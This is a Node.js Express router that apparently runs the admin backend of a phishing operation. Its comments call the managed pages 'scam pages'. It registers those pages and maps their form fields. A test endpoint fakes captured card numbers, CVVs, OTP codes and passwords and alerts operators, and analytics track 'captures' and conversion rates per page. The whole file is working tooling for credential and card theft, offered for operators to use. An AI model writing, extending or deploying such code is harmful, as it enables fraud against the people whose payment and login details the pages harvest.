const router = require('express').Router();
const { getAdapter } = require('../database/adapter');
const { authenticateToken, requireGod, requireAction } = require('../middleware/auth');
const { writeAudit } = require('../services/audit');
const { requireWebsiteAccess, ownsWebsite } = require('../middleware/scope');
const fs = require('fs');
const path = require('path');

// Apply auth to all funnel/demo-page routes
router.use(authenticateToken);

// Scam pages and funnel mutations are god-only
router.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    return requireGod(req, res, next);
  }
  next();
});

// ─── GET /api/funnels/demo-pages ──────────────────────────────────────────────────
router.get('/demo-pages', async (req, res) => {
  try {
    const db = getAdapter();
    const { website_id } = req.query;
    let pages;
    if (website_id) {
      const wid = parseInt(website_id, 10);
      // Non-god can only read demo pages for websites they own.
      if (!(await ownsWebsite(req, wid))) return res.json({ pages: [] });
      pages = await db.all('SELECT * FROM demo_pages WHERE website_id = ? ORDER BY name ASC', [wid]);
    } else {
      pages = []; // Do not leak all pages when website_id is not specified
    }
    const parsed = pages.map(p => {
      try { p.fields_schema = typeof p.fields_schema === 'string' ? JSON.parse(p.fields_schema || '[]') : (p.fields_schema || []); } catch { p.fields_schema = []; }
      try { p.field_mappings = typeof p.field_mappings === 'string' ? JSON.parse(p.field_mappings || '{}') : (p.field_mappings || {}); } catch { p.field_mappings = {}; }
      return p;
    });
    res.json({ pages: parsed });
  } catch (err) {
    console.error('List demo pages error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── POST /api/funnels/demo-pages ─────────────────────────────────────────────
router.post('/demo-pages', requireAction('demo-pages', 'create'), async (req, res) => {
  try {
    const db = getAdapter();
    const { url, name, form_type = 'general', fields_schema = [], field_mappings = {}, website_id } = req.body;

    if (!url || !name) {
      return res.status(400).json({ error: 'url and name are required' });
    }

    const schemaStr = typeof fields_schema === 'string' ? fields_schema : JSON.stringify(fields_schema);
    const mappingsStr = typeof field_mappings === 'string' ? field_mappings : JSON.stringify(field_mappings);
    const webId = website_id ? parseInt(website_id, 10) : null;

    // Ownership gate — a non-god caller can only attach a demo_page to a
    // website they own. Unattached (webId == null) demo pages are god-only.
    if (webId == null && req.effectiveUserId != null) {
      return res.status(403).json({ error: 'Unattached demo pages are god-only' });
    }
    if (webId != null && !(await ownsWebsite(req, webId))) {
      return res.status(404).json({ error: 'Website not found' });
    }

    const result = await db.run(
      'INSERT INTO demo_pages (website_id, url, name, form_type, fields_schema, field_mappings) VALUES (?, ?, ?, ?, ?, ?)',
      [webId, url.trim(), name.trim(), form_type.trim(), schemaStr, mappingsStr]
    );

    await writeAudit(req, `Created demo page: ${url}`, 'settings', { url, name, form_type, website_id: webId });

    const page = await db.get('SELECT * FROM demo_pages WHERE id = ?', [result.lastInsertRowid]);
    if (page) {
      try { page.fields_schema = typeof page.fields_schema === 'string' ? JSON.parse(page.fields_schema || '[]') : (page.fields_schema || []); } catch { page.fields_schema = []; }
      try { page.field_mappings = typeof page.field_mappings === 'string' ? JSON.parse(page.field_mappings || '{}') : (page.field_mappings || {}); } catch { page.field_mappings = {}; }
    }

    res.json({ page, message: 'Demo page created' });
  } catch (err) {
    if (err.message && err.message.includes('UNIQUE')) {
      return res.status(409).json({ error: 'A demo page with that URL already exists' });
    }
    console.error('Create demo page error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── PUT /api/funnels/demo-pages/:id ──────────────────────────────────────────
router.put('/demo-pages/:id', requireAction('demo-pages', 'edit'), async (req, res) => {
  try {
    const db = getAdapter();
    const { id } = req.params;
    const { name, form_type, fields_schema, field_mappings, website_id } = req.body;

    const existing = await db.get('SELECT * FROM demo_pages WHERE id = ?', [parseInt(id, 10)]);
    if (!existing) {
      return res.status(404).json({ error: 'Demo page not found' });
    }

    // Ownership gate — the caller must own the page's current website AND the
    // target website if they're moving it. Unattached rows (website_id NULL)
    // are god-only.
    if (existing.website_id == null && req.effectiveUserId != null) {
      return res.status(404).json({ error: 'Demo page not found' });
    }
    if (existing.website_id != null && !(await ownsWebsite(req, existing.website_id))) {
      return res.status(404).json({ error: 'Demo page not found' });
    }

    const newName = name !== undefined ? name.trim() : existing.name;
    const newType = form_type !== undefined ? form_type.trim() : existing.form_type;
    const newSchema = fields_schema !== undefined
      ? (typeof fields_schema === 'string' ? fields_schema : JSON.stringify(fields_schema))
      : existing.fields_schema;
    const newMappings = field_mappings !== undefined
      ? (typeof field_mappings === 'string' ? field_mappings : JSON.stringify(field_mappings))
      : existing.field_mappings;
    const newWebId = website_id !== undefined ? (website_id ? parseInt(website_id, 10) : null) : existing.website_id;

    // If the caller is moving the page to a different website, verify they
    // own the target as well. Non-god cannot detach (move to NULL).
    if (newWebId !== existing.website_id) {
      if (newWebId == null && req.effectiveUserId != null) {
        return res.status(403).json({ error: 'Only god can detach a demo page' });
      }
      if (newWebId != null && !(await ownsWebsite(req, newWebId))) {
        return res.status(404).json({ error: 'Target website not found' });
      }
    }

    await db.run(
      'UPDATE demo_pages SET name = ?, form_type = ?, fields_schema = ?, field_mappings = ?, website_id = ? WHERE id = ?',
      [newName, newType, newSchema, newMappings, newWebId, parseInt(id, 10)]
    );

    await writeAudit(req, `Updated demo page: ${existing.url}`, 'settings', { id, name: newName, form_type: newType, website_id: newWebId });

    const page = await db.get('SELECT * FROM demo_pages WHERE id = ?', [parseInt(id, 10)]);
    if (page) {
      try { page.fields_schema = typeof page.fields_schema === 'string' ? JSON.parse(page.fields_schema || '[]') : (page.fields_schema || []); } catch { page.fields_schema = []; }
      try { page.field_mappings = typeof page.field_mappings === 'string' ? JSON.parse(page.field_mappings || '{}') : (page.field_mappings || {}); } catch { page.field_mappings = {}; }
    }

    res.json({ page, message: 'Demo page updated' });
  } catch (err) {
    console.error('Update demo page error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── DELETE /api/funnels/demo-pages/:id ───────────────────────────────────────
router.delete('/demo-pages/:id', requireAction('demo-pages', 'delete'), async (req, res) => {
  try {
    const db = getAdapter();
    const { id } = req.params;

    const existing = await db.get('SELECT * FROM demo_pages WHERE id = ?', [parseInt(id, 10)]);
    if (!existing) {
      return res.status(404).json({ error: 'Demo page not found' });
    }

    // Ownership gate — 404 hides existence from callers who don't own the
    // page's parent website. Unattached rows are god-only.
    if (existing.website_id == null && req.effectiveUserId != null) {
      return res.status(404).json({ error: 'Demo page not found' });
    }
    if (existing.website_id != null && !(await ownsWebsite(req, existing.website_id))) {
      return res.status(404).json({ error: 'Demo page not found' });
    }

    await db.run('DELETE FROM demo_pages WHERE id = ?', [parseInt(id, 10)]);

    await writeAudit(req, `Deleted demo page: ${existing.url}`, 'settings', { id, url: existing.url });

    res.json({ message: 'Demo page deleted' });
  } catch (err) {
    console.error('Delete demo page error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /api/funnels ───────────────────────────────────────────────────────────
router.get('/', async (req, res) => {
  try {
    const db = getAdapter();
    const { website_id } = req.query;

    if (!website_id) {
      return res.status(400).json({ error: 'website_id query parameter is required' });
    }
    const wid = parseInt(website_id, 10);
    if (!(await ownsWebsite(req, wid))) return res.json({ funnel: null });

    const funnel = await db.get('SELECT * FROM funnels WHERE website_id = ? AND is_active = 1 LIMIT 1', [wid]);

    if (funnel) {
      try { funnel.steps = typeof funnel.steps === 'string' ? JSON.parse(funnel.steps || '[]') : (funnel.steps || []); } catch { funnel.steps = []; }
    }

    res.json({ funnel: funnel || null });
  } catch (err) {
    console.error('Get funnel error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── POST /api/funnels ──────────────────────────────────────────────────────────
router.post('/', requireAction('funnels', 'create'), async (req, res) => {
  try {
    const db = getAdapter();
    const { website_id, name = 'Default Funnel', steps = [] } = req.body;

    if (!website_id) {
      return res.status(400).json({ error: 'website_id is required' });
    }

    // Ownership gate — a caller can only save a funnel on a website they own.
    const wid = parseInt(website_id, 10);
    if (!(await ownsWebsite(req, wid))) {
      return res.status(404).json({ error: 'Website not found' });
    }

    const stepsStr = typeof steps === 'string' ? steps : JSON.stringify(steps);

    // Check if funnel already exists for the website
    const existing = await db.get('SELECT id FROM funnels WHERE website_id = ? LIMIT 1', [wid]);

    if (existing) {
      await db.run(`
        UPDATE funnels
        SET name = ?, steps = ?, updated_at = CURRENT_TIMESTAMP
        WHERE id = ?
      `, [name, stepsStr, existing.id]);
    } else {
      await db.run(`
        INSERT INTO funnels (website_id, name, steps, is_active)
        VALUES (?, ?, ?, 1)
      `, [wid, name, stepsStr]);
    }

    // Audit log
    await writeAudit(req, `Updated funnel for website ${website_id}`, 'settings', { website_id, steps });

    res.json({ message: 'Funnel configuration saved successfully' });
  } catch (err) {
    console.error('Save funnel error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /demo-pages/:websiteId/orphaned ──────────────────────────────────────
router.get('/demo-pages/:websiteId/orphaned', requireWebsiteAccess('param:websiteId'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.websiteId, 10);

    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!website) {
      return res.status(404).json({ error: 'Website not found' });
    }
    if (!website.demo_slug) {
      return res.json({ orphaned: [] });
    }

    const pages = await db.all('SELECT * FROM demo_pages WHERE website_id = ?', [websiteId]);
    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
    
    const orphaned = [];
    
    for (const page of pages) {
      const urlParts = page.url.split('/').filter(Boolean);
      const pageName = urlParts[urlParts.length - 1];
      const filename = pageName.endsWith('.html') ? pageName : `${pageName}.html`;
      
      const filePath = path.join(siteDir, filename);
      
      if (!fs.existsSync(filePath)) {
        orphaned.push({
          ...page,
          expectedFile: filename,
          fields_schema: typeof page.fields_schema === 'string' ? JSON.parse(page.fields_schema || '[]') : (page.fields_schema || []),
          field_mappings: typeof page.field_mappings === 'string' ? JSON.parse(page.field_mappings || '{}') : (page.field_mappings || {})
        });
      }
    }

    res.json({ orphaned, count: orphaned.length });
  } catch (err) {
    console.error('Get orphaned pages error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── POST /demo-pages/bulk-delete ─────────────────────────────────────────────
router.post('/demo-pages/bulk-delete', requireAction('funnels', 'bulk-delete'), async (req, res) => {
  try {
    const db = getAdapter();
    const { ids } = req.body;

    if (!Array.isArray(ids) || ids.length === 0) {
      return res.status(400).json({ error: 'ids array is required' });
    }

    const placeholders = ids.map(() => '?').join(',');
    const parsedIds = ids.map(id => parseInt(id, 10));
    const pages = await db.all(`SELECT * FROM demo_pages WHERE id IN (${placeholders})`, parsedIds);

    // Multi-tenant scope: every page targeted must belong to a website the
    // caller owns. Refuses the whole batch on any violation so it never
    // partially deletes. God unrestricted (unless impersonating).
    if (req.effectiveUserId != null) {
      const outOfScope = [];
      for (const p of pages) {
        if (!(await ownsWebsite(req, p.website_id))) outOfScope.push(p);
      }
      if (outOfScope.length) {
        return res.status(403).json({
          error: `Refused: ${outOfScope.length} page(s) belong to websites you do not own.`,
          out_of_scope_ids: outOfScope.map(p => p.id),
        });
      }
    }

    await db.run(`DELETE FROM demo_pages WHERE id IN (${placeholders})`, parsedIds);

    // Audit log
    await writeAudit(req, `Bulk deleted ${ids.length} demo pages`, 'settings', { deleted: pages.map(p => ({ id: p.id, name: p.name, url: p.url })) });

    res.json({ message: `${ids.length} pages deleted`, deleted: ids.length });
  } catch (err) {
    console.error('Bulk delete error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── POST /demo-pages/bulk-update ─────────────────────────────────────────────
router.post('/demo-pages/bulk-update', requireAction('funnels', 'bulk-edit'), async (req, res) => {
  try {
    const db = getAdapter();
    const { ids, updates } = req.body;

    if (!Array.isArray(ids) || ids.length === 0) {
      return res.status(400).json({ error: 'ids array is required' });
    }

    if (!updates || typeof updates !== 'object') {
      return res.status(400).json({ error: 'updates object is required' });
    }

    const allowedFields = ['form_type', 'website_id'];
    const setStatements = [];
    const values = [];

    for (const [key, value] of Object.entries(updates)) {
      if (allowedFields.includes(key)) {
        setStatements.push(`${key} = ?`);
        values.push(value);
      }
    }

    if (setStatements.length === 0) {
      return res.status(400).json({ error: 'No valid update fields provided' });
    }

    const placeholders = ids.map(() => '?').join(',');
    const parsedIds = ids.map(id => parseInt(id, 10));

    // Multi-tenant scope: refuse if any targeted page — OR the new website_id
    // (when updating website_id) — belongs to a website not owned by the caller.
    if (req.effectiveUserId != null) {
      const targets = await db.all(
        `SELECT id, website_id FROM demo_pages WHERE id IN (${placeholders})`, parsedIds
      );
      const outOfScope = [];
      for (const p of (targets || [])) {
        if (!(await ownsWebsite(req, p.website_id))) outOfScope.push(p);
      }
      if (outOfScope.length) {
        return res.status(403).json({
          error: `Refused: ${outOfScope.length} page(s) belong to websites you do not own.`,
          out_of_scope_ids: outOfScope.map(p => p.id),
        });
      }
      if (updates.website_id !== undefined) {
        if (!(await ownsWebsite(req, updates.website_id))) {
          return res.status(403).json({ error: 'You cannot reassign pages to a website you do not own.' });
        }
      }
    }

    values.push(...parsedIds);

    await db.run(`UPDATE demo_pages SET ${setStatements.join(', ')} WHERE id IN (${placeholders})`, values);

    // Audit log
    await writeAudit(req, `Bulk updated ${ids.length} demo pages`, 'settings', { ids, updates });

    res.json({ message: `${ids.length} pages updated`, updated: ids.length });
  } catch (err) {
    console.error('Bulk update error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── POST /demo-pages/:id/rescan-fields ────────────────────────────────────
// Re-run scanFieldsFromHtml on the current file and refresh fields_schema.
// Useful when the HTML has been edited/replaced but the registry drifted.
router.post('/demo-pages/:id/rescan-fields', requireAction('demo-pages', 'edit'), async (req, res) => {
  try {
    const db = getAdapter();
    const pageId = parseInt(req.params.id, 10);
    const page = await db.get('SELECT * FROM demo_pages WHERE id = ?', [pageId]);
    if (!page) return res.status(404).json({ error: 'Page not found' });
    if (page.website_id == null && req.effectiveUserId != null) return res.status(404).json({ error: 'Page not found' });
    if (page.website_id != null && !(await ownsWebsite(req, page.website_id))) return res.status(404).json({ error: 'Page not found' });

    const website = await db.get('SELECT demo_slug FROM websites WHERE id = ?', [page.website_id]);
    if (!website || !website.demo_slug) return res.status(400).json({ error: 'Website has no demo slug' });

    // Derive HTML filename from URL: /demo/<slug>/<basename> or /<slug>/<basename>
    const basename = String(page.url || '').split('/').pop().replace(/\.html?$/i, '');
    if (!basename) return res.status(400).json({ error: 'Could not derive HTML filename from URL' });

    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
    let filePath = path.join(siteDir, `${basename}.html`);
    if (!fs.existsSync(filePath)) {
      // Try .htm as a fallback
      const alt = path.join(siteDir, `${basename}.htm`);
      if (fs.existsSync(alt)) filePath = alt;
      else return res.status(404).json({ error: `HTML file not found: ${basename}.html`, orphaned: true });
    }

    const { scanFieldsFromHtml } = require('../services/scanFields');
    const html = fs.readFileSync(filePath, 'utf8');
    const scanned = scanFieldsFromHtml(html);
    const fields = scanned.fields || [];
    await db.run('UPDATE demo_pages SET fields_schema = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?', [JSON.stringify(fields), pageId]);
    await writeAudit(req, `Re-scanned fields for page ${page.name}`, 'settings', { page_id: pageId, fields_count: fields.length, strategy: scanned.strategy });
    res.json({ ok: true, page_id: pageId, fields, strategy: scanned.strategy });
  } catch (err) {
    console.error('Rescan fields error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── POST /demo-pages/:id/test-capture ─────────────────────────────────────
// Fire a synthetic capture event for testing. Emits admin:notification and
// bumps submissions_count so operators can verify wiring without opening the
// scam page from a real browser.
router.post('/demo-pages/:id/test-capture', requireAction('demo-pages', 'edit'), async (req, res) => {
  try {
    const db = getAdapter();
    const pageId = parseInt(req.params.id, 10);
    const page = await db.get('SELECT * FROM demo_pages WHERE id = ?', [pageId]);
    if (!page) return res.status(404).json({ error: 'Page not found' });
    if (page.website_id == null && req.effectiveUserId != null) return res.status(404).json({ error: 'Page not found' });
    if (page.website_id != null && !(await ownsWebsite(req, page.website_id))) return res.status(404).json({ error: 'Page not found' });

    const website = await db.get('SELECT id, name, owner_id FROM websites WHERE id = ?', [page.website_id]);
    let fields = [];
    try { fields = typeof page.fields_schema === 'string' ? JSON.parse(page.fields_schema || '[]') : (page.fields_schema || []); } catch {}

    // Build dummy values that look like real data (so mapping tests pass)
    const dummyFor = (name) => {
      const n = String(name).toLowerCase();
      if (n.includes('email')) return 'test@example.com';
      if (n.includes('phone')) return '+1-555-0100';
      if (n.includes('otp') || n.includes('code'))    return '000000';
      if (n.includes('cvv'))    return '123';
      if (n.includes('exp'))    return '12/29';
      if (n.includes('card'))   return '4111111111111111';
      if (n.includes('pass'))   return 'test-pw-1234';
      if (n.includes('user'))   return 'testuser';
      return 'TEST_VALUE';
    };
    const capturedFields = {};
    for (const f of fields) capturedFields[f] = dummyFor(f);

    await db.run('UPDATE demo_pages SET submissions_count = submissions_count + 1, last_activity_at = CURRENT_TIMESTAMP WHERE id = ?', [pageId]);
    await db.run(
      'INSERT INTO activity_feed (owner_id, type, icon, message, details, website_id) VALUES (?, ?, ?, ?, ?, ?)',
      [website?.owner_id || null, 'formdata', '🧪',
       `Test capture on ${page.name} — ${Object.keys(capturedFields).length} field(s)`,
       JSON.stringify({ page_id: pageId, page: page.url, fields: capturedFields, test: true }),
       page.website_id]
    );

    const io = require('../services/notification').getIo();
    if (io && website) {
      io.of('/admin').to(`user:${website.owner_id}`).to('god').emit('admin:test-capture', {
        page_id: pageId, page_url: page.url, page_name: page.name,
        website_id: website.id, fields: capturedFields
      });
    }

    await writeAudit(req, `Test capture fired on page ${page.name}`, 'settings', { page_id: pageId, fields: Object.keys(capturedFields) });
    res.json({ ok: true, page_id: pageId, fields: capturedFields, count: Object.keys(capturedFields).length });
  } catch (err) {
    console.error('Test capture error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── POST /demo-pages/import ───────────────────────────────────────────────
// Import pages from a JSON export. Upserts by URL — an existing URL is
// overwritten, a new URL is created. Non-god callers must own the target site.
router.post('/demo-pages/import', requireAction('demo-pages', 'create'), async (req, res) => {
  try {
    const db = getAdapter();
    const { website_id, pages, mode = 'upsert' } = req.body || {};
    if (!website_id) return res.status(400).json({ error: 'website_id required' });
    if (!Array.isArray(pages)) return res.status(400).json({ error: 'pages must be an array' });
    if (pages.length > 200) return res.status(400).json({ error: 'Import limited to 200 pages' });
    const wid = parseInt(website_id, 10);
    if (!(await ownsWebsite(req, wid))) return res.status(404).json({ error: 'Website not found' });

    let created = 0, updated = 0, skipped = 0;
    for (const p of pages) {
      if (!p || !p.url || !p.name) { skipped++; continue; }
      const url = String(p.url);
      const name = String(p.name).slice(0, 200);
      const form_type = String(p.form_type || 'general').slice(0, 40);
      const schema = JSON.stringify(Array.isArray(p.fields_schema) ? p.fields_schema : []);
      const mappings = JSON.stringify(typeof p.field_mappings === 'object' && p.field_mappings ? p.field_mappings : {});
      const existing = await db.get('SELECT id FROM demo_pages WHERE url = ?', [url]);
      if (existing) {
        if (mode === 'skip') { skipped++; continue; }
        await db.run(
          'UPDATE demo_pages SET name = ?, form_type = ?, fields_schema = ?, field_mappings = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
          [name, form_type, schema, mappings, existing.id]
        );
        updated++;
      } else {
        await db.run(
          'INSERT INTO demo_pages (website_id, url, name, form_type, fields_schema, field_mappings) VALUES (?, ?, ?, ?, ?, ?)',
          [wid, url, name, form_type, schema, mappings]
        );
        created++;
      }
    }
    await writeAudit(req, `Imported ${pages.length} page(s)`, 'settings', { website_id: wid, created, updated, skipped });
    res.json({ ok: true, created, updated, skipped, total: pages.length });
  } catch (err) {
    console.error('Import pages error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /demo-pages/health ────────────────────────────────────────────────
// Panel-wide health summary for one site: total pages, orphans, capturing,
// today's captures, sparkline of last-7-day submissions per page.
router.get('/demo-pages/health', async (req, res) => {
  try {
    const db = getAdapter();
    const wid = parseInt(req.query.website_id, 10);
    if (!Number.isFinite(wid)) return res.status(400).json({ error: 'website_id required' });
    if (!(await ownsWebsite(req, wid))) return res.status(404).json({ error: 'Website not found' });

    const pages = await db.all('SELECT id, url, submissions_count FROM demo_pages WHERE website_id = ?', [wid]);
    const website = await db.get('SELECT demo_slug FROM websites WHERE id = ?', [wid]);

    let orphaned = 0;
    if (website && website.demo_slug) {
      const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
      const present = new Set();
      if (fs.existsSync(siteDir)) {
        (function walk(dir, base = '') {
          for (const item of fs.readdirSync(dir, { withFileTypes: true })) {
            const rel = base ? `${base}/${item.name}` : item.name;
            if (item.isDirectory()) walk(path.join(dir, item.name), rel);
            else if (item.isFile() && /\.html?$/i.test(item.name)) present.add(rel.replace(/\.html?$/i, '').toLowerCase());
          }
        })(siteDir);
      }
      for (const p of pages) {
        const base = String(p.url || '').split('/').pop().toLowerCase();
        if (!present.has(base)) orphaned++;
      }
    }

    const capturing = pages.filter(p => (p.submissions_count || 0) > 0).length;
    const totalCaps = pages.reduce((a, p) => a + (p.submissions_count || 0), 0);
    const todayRow = await db.get(
      `SELECT COUNT(*) as c FROM activity_feed WHERE type = 'formdata' AND website_id = ? AND timestamp >= CURRENT_DATE`,
      [wid]
    );
    res.json({
      total: pages.length,
      orphaned,
      capturing,
      totalCaptures: totalCaps,
      capturesToday: todayRow?.c || 0
    });
  } catch (err) {
    console.error('Registry health error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /demo-pages/:id/analytics ────────────────────────────────────────────
router.get('/demo-pages/:id/analytics', async (req, res) => {
  try {
    const db = getAdapter();
    const pageId = parseInt(req.params.id, 10);

    const page = await db.get('SELECT * FROM demo_pages WHERE id = ?', [pageId]);
    if (!page) {
      return res.status(404).json({ error: 'Page not found' });
    }
    // Non-god may only read pages under a website they own.
    if (!(await ownsWebsite(req, page.website_id))) {
      return res.status(404).json({ error: 'Page not found' });
    }

    const stats = {
      views: page.views_count || 0,
      submissions: page.submissions_count || 0,
      lastActivity: page.last_activity_at,
      createdAt: page.created_at
    };

    const thirtyDaysAgo = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString();
    
    const viewsByDay = await db.all(`
      SELECT DATE(timestamp) as date, COUNT(*) as count
      FROM page_views
      WHERE page_url = ? AND timestamp >= ?
      GROUP BY DATE(timestamp)
      ORDER BY date DESC
      LIMIT 30
    `, [page.url, thirtyDaysAgo]);

    const capturedData = await db.get(`
      SELECT COUNT(*) as count
      FROM captured_data
      WHERE page_url = ? AND timestamp >= ?
    `, [page.url, thirtyDaysAgo]);

    res.json({
      pageId,
      pageName: page.name,
      pageUrl: page.url,
      stats,
      viewsByDay,
      recentSubmissions: capturedData ? (capturedData.count || 0) : 0,
      conversionRate: stats.views > 0 ? ((stats.submissions / stats.views) * 100).toFixed(2) : 0
    });
  } catch (err) {
    console.error('Get analytics error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

module.exports = router;
